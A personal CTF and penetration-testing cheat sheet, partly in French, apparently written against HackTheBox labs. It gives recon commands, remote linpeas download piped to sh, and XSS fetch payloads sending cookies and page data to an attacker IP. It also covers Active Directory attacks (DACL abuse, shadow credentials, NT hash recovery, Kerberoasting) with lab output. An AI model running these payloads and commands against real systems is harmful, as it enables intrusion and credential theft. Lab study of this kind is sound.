# Tuto

```bash
exegol start -cwd -fs --disable-shared-timezones CTF2
```

## Discovery

<details>

Command for obtimal informations :

```bash
nmap -Pn -sC -sV -p- -T4 -vvvv --reason "$TARGET"
```

- -Pn: This option tells Nmap to skip the host discovery phase. Normally, Nmap first checks to see if a host is online before scanning it, but -Pn assumes the host is up.
- -sC: This enables the default script scan, which uses a set of Nmap scripts (NSE scripts) to perform additional service detection, vulnerability detection, and other tasks.
- -sV: This option enables version detection, which tries to determine the version of the services running on open ports.
- -p-: This tells Nmap to scan all 65535 ports, not just the default 1000 ports.
- -T4: This sets the timing template to level 4 (Aggressive). Timing templates control the speed of the scan, with higher numbers being faster but more likely to be detected and blocked by firewalls and intrusion detection systems.
- -vvvvv: This sets the verbosity level to 5, the highest level. This provides very detailed output during the scan process.b
- --reason: This tells Nmap to include the reason each port is in its state (open, closed, filtered, etc.) in the output. This can provide additional insight into why a port is reported in a particular state.

## Fuzzing

### fuff

Fuzz for pages :

`ffuf -c -w /opt/seclists/Discovery/Web-Content/big.txt -u "http://$TARGET/FUZZ"`

Fuzz for subdomain using the header host :

`ffuf -c -w /opt/seclists/Discovery/Web-Content/list_of_ports.txt -u "http://$TARGET/" -H "X-Forwarded-For: FUZZ"`

To avoid false positive, use of filters :

- fw : to filter by the amount of words
- fl : to filter by the number of lines
- fs : to filter by the size of the response
- fc : to filter by the status code
- fr : to filter by the regex pattern

</details>

## Vulnerabilities

<details>

### searchsploit

`searchsploit <name + version>` to get all the potential exploits

`searchsploit -x <number>` to show the exploit
`searchsploit -p <number>` to show the path and other info

### linepeas

from your computer :

```
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

</details>

## Web

<details>

### JS

#### Browser-Based Exploitation (XSS, CSRF, etc.)

It's possible to get some data and return the result to a local socket.

> use netcat and not python3 (can't deal with the POST)

```JavaScript
fetch('http://10.10.14.117:4444', {
  method: 'POST',
  body: JSON.stringify({ cookies: document.cookie }),
});
```

You can also make an SSTI ?

```JavaScript
fetch('http://alert.htb/messages')
  .then(response => response.text())
  .then(data => {
    fetch('http://10.10.14.117:4444', {
      method: 'POST',
      body: data,
    });
  });
```

### Burpsuite

#### Reconnaissance

Proxy -> History -> Analyse and HighLight the interesting ones/rabbit hole/start of a transaction (login as example)

Repeater -> Rename tabs, star for the interesting ones

Try to know what every endpointd to.

#### Bruteforce

Tab Intruder/Positions  Clear all injections points and add the usefuls ones.

Attack type :

- Sniper : Chaque champ est modifié à son tour
- Battering Ram : same payload in all the injections points
- Pitchfork : each injection point have his own payload list but there ie no mixing.
- Clsuter Bomb : all possible combination

Tab Options : `grep payloads` to show only a part of the answer. `grep extract` a tester également, faire les pros and cons

</details>

## Active Directory

<details>

### SMB

First get some information with `enum4linux`. (It's the most complete tool IMO)

```bash
enum4linux-ng -A "$TARGET" -u "$USER" -p "$PASSWORD"
```

This might not be working. Therefore, you should use `ldapsearch`. For example, you can use the following command.

```bash
ldapsearch -x -H ldap://"$DC_HOST" -D "$USER"@"$DOMAIN" -w "$PASSWORD" -b "DC=VINTAGE,DC=HTB" "(objectClass=user)" sAMAccountName memberOf
```

The `-x` is for the 'simple authentication', used in combinaison of the -D and the -w. The `-b` is the base search. Here, this limits the query to only objects under the domain. Then, you specify a filter, here you want all the `user` object. Then, you can filter for specific attributes. Here the unique logon of the user and the groups it belongs to.

### Bloodhound

```bash
# très rapide (mais parfois marche pas très bien ?)
rusthound -d "$DOMAIN" -u "$USER"@"$DOMAIN" -p "$PASSWORD" --zip --ldaps --adcs --old-bloodhound

# ou bien
bloodhound-python -d certified.htb -ns 10.10.11.41 -u "$USER" -p "$PASSWORD" -c All --zip

# then
neo4j start
# wait 1 minute
bloodhound &> /dev/null &
```

Then look for `First degree object control` or `Transitive Object Control`.

### DACL abuse

It identify the users and groups that are allowed or denied access on an object.

For example, with `Owns / Write Member` we can grant any user some permissions such as `WriteMembers`.

```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'JUDITH.MADER' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' "$DOMAIN"/"$USER":"$PASSWORD"
[*] DACL backed up to dacledit-20241221-194223.bak
[*] DACL modified successfully!

```

Add a user in a group

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember $TargetGroup $TargetUser
[+] judith.mader added to Management
```

### Shadow Credentials

Active Directory user and computer objects have an attribute called `msDS-KeyCredentialLink` where raw public keys can be set.

<details>

<summary>Old way</summary>

```bash
pywhisker.py -d $DOMAIN -u $USER -p $PASSWORD --target 'MANAGEMENT_SVC' --action "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 640a8a6f-755d-bd2a-f436-7bc5415bc967
[*] Updating the msDS-KeyCredentialLink attribute of MANAGEMENT_SVC
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: rCEvgXXN.pfx
[*] Must be used with password: olqnQEPOPhV3kn2jHoGR
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

### Pass the certificate

Pass the Certificate is the fancy name given to the pre-authentication operation relying on a certificate (i.e. key pair) to pass in order to obtain a TGT.

```bash
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
2024-12-22 02:49:57,837 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-12-22 02:49:57,941 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-12-22 02:49:58,011 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-12-22 02:49:58,012 minikerberos INFO     bb9f7c3c55592b8eafe07e8ed27a812add9c96066dc1ea8805e65b002da8d036
INFO:minikerberos:bb9f7c3c55592b8eafe07e8ed27a812add9c96066dc1ea8805e65b002da8d036
2024-12-22 02:49:58,028 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

#### UnPAC the hash

A TGT (Ticket Granting Ticket) includes in the ticket a `PAC_CREDENTIAL_INFO` structure containing the NTLM keys (i.e. LM and NT hashes) of the authenticating user. This feature allows users to switch to NTLM authentications when remote servers don't support Kerberos. Once the TGT is obtained, and the session key extracted (printed by gettgtpkinit.py), the getnthash.py script can be used to recover the NT hash.

```bash
export KRB5CCNAME=tgt.cache
getnthash.py -key bb9f7c3c55592b8eafe07e8ed27a812add9c96066dc1ea8805e65b002da8d036 "$DOMAIN"/management_svc
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```
</details>

<details>

<summary>Automatic way !</summary>

```bash
certipy shadow auto -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
```

</details>

### Kebreoast

```bash
targetedKerberoast.py -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
```

If issue of time:

```bash
faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

## Amazing reverse shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm  #This will give you commands as clear
ctrl + z # To background the session
stty raw -echo; fg  #You get an interactive lovely shell!
```

</details>

## Cryptographie

### RSA Bascis

RSA key pair is generated with 3 information : e, p, q

## Reverse Engineering

<details>
<!-- <summary>details</summary> -->

### Introduction

#### Compilers

Instructions (Assembly Code) -> binary code (Asselbled Bytecode)
Tools like hydra allow binary code -> Assembly code

#### Linking

Entry point
Used to define memory regions

#### ELF - Executable Linking Format

Symbols table : this function at this location, this var at this loc

`.symtab` Symbols used for debugging.
`.dynsym` Symbols for dynamic linking.

=> How to setup everything

#### CCL

Machine Code -> Assembly Language = Disassembly

### Computer Architecture

When a program is running :

1. Instruction is read into memory
2. Instruction is processed by the ALU
3. The result of the operation is stored into registers or memory

Registers : x86_64 uses 16 64bit general purpose registers

RIP : Insutrction pointer

Intruction : operation being performed by the CPU.

RSP : top of the stack

RBP : base pointer

### Stack Frame

RBP vs RSP ?

how do we know param_2(argv[1]) is at local_28.

#### Default One

```
|--------------------|
|    return address  | <-- RBP (frame pointer)
|--------------------|
|    previous RBP    |
|--------------------|
|    param_1 (argc)  | <-- [RBP + 0x10]
|--------------------|
|    param_2 (argv)  | <-- [RBP + 0x(1|2)8]
|--------------------|
|    local_10        | <-- [RBP + 0x10] (local variables)
|--------------------|
|    local_28        | <-- [RBP + 0x28] (local variables)
|--------------------|
```
</details>

Rouge : pas dans la mémoire

l :label
t :type
f :function
g :goto


## ARM Reversing

GHIDRA better tables ?

créer le projet ghidra
congifurer la memory map
chercher la main
Analyse RF functions
Computing Flight Command (elaboration consigne de vol)
Hijacking the drone ?

Processus itératif. analyse, test, check => affiner le code C
On cherche quelque chose de suffisament précis, pas la vérité

R13 Stack counter (sp)
R16 Program counter => prochaine

As a reverser what information are stored in the memory ?

Obj1: Data exchanged between the remote and the drone
Obj2: rf secured ?
Obj3: pilot the drone from an other equipement ?

Definir les zones de RAM et les différentes ressources
Activation de liens de `cross reference` dans Ghidra

CTRL+f memory mapping =>identifier les zones et les saisir dans Ghidra

Find main ? Première instruction executée par le micro controller ?

ISR ? Evts Materiel, déclenche execution logicielle

Vector table ? Tableau avec tt les addr qui gèrent les evts materiel
On y trouve l addr de la première instruction executee
offest 0 => valeur de SP au reset
offset 4 => valeur de PC au reset

Avant le main, initalisation de la RAM

Reconstituation des fonctions/var au fur et a mesure

Decouverte d'une seconde fonction aui met à jour les commandes de vol
Il se trouve que les valeurs modifiés sont prises depuis un registre précis, UART.

### ARM

ldr (load register)

Quelles sont les addresses mémoires ? Quelles sont les addresses de la flash ?

push puis sub => allocation mémoire
puis appel fonction

sub : reduire la pile
pop : restorer le context initial vers la fonction appelante

ARM aggressive instruction finder

Main en ARM :
initalisation ressources hw == configuration des paramètres => mesures d etat, remise à 0 des capteurs
Je mesure mes entrees, j anayse la donnée, je fais une application
lancement dans une boucle infinie

updateInputs
updateInternalState
updateOutputs

little endian car commence par le bit de poids faible

## OT course

<details>

ISA99 ???

IT = Information Technology (Laptop, servers used to store and process data)
OT = Operational Technology (Manages any process that manipulate some type of actions in the real world)
ICS = Industrial Control System (Larger scale deployement of OT in industrial environnements)

OT priority = physical / environnmental safety

Usually OT can connect to IT but IT can't reach to OT. Because IT is connected to Internet so it will be compromised.
=> Firewell between IT and OT

### Ways Attackers Enter ICS/OT Networks

- From the IT network
- Control System exposed to the Internet
- Remote access capabilities (upgrade frimware from home (=safety) )
- Malicious Insiders

### OT example

Thermostat. It's a computer and code to know what he has to do. Buttons to set variables.
And then the OT device recevies data continually from outside sensors/sources. If it's too hot, send signal to turn on air conditioning.
=> PLC

Same idea when talking about nuclear plants.

### Where the risk come from ?

Gain access and control the assets. Then can control the physical stuff => Safety Issues.

### SCADA

ICS = LAN
SCADA = Supervisory Control And Data Acquisition = WAN = multiple systmes that connects together over wide areas.

Assets Owners / Operators. Not always the same

### Threat Actors

- Natation state
- Criminal Organizations
- Ransomware Groups
- Hacktivits
- Cyber mercenaries
- Lone Wolf
- Script kiddies

### Example : The Colonial Pipeline

Ransomware Attack by BlackSide
()

</details>
